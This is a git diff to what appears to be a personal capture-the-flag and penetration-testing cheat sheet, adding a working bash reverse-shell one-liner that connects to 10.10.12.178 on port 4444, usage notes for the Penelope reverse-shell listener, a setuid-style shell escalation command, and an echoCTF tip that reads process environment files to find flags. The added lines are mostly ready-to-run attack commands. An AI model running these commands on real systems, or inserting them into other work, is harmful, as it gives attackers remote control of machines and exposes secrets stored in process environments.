@@ -25,11 +25,19 @@ script -qc /bin/bash /dev/null
 
 ### Priv Esc
 
+#### Python
 `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
+#### Shell
+
 
 ## Extras
 
 - Penelope: https://github.com/brightio/penelope
+
+```shell
+bash -c 'exec bash >& /dev/tcp/10.10.12.178/4444 0>&1 &'
+```
+
 ```shell
 penelope                          # Listening for reverse shells on 0.0.0.0:4444
 penelope -a                       # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
@@ -45,3 +53,9 @@ penelope -s <File/Folder>         # Share a file or folder via HTTP
 - Ghidra
 - IDA
 - Decompiler Online: https://dogbolt.org
+
+### Tips
+
+#### echoCTF
+
+`strings /proc//environ | grep "ETSCTF"`
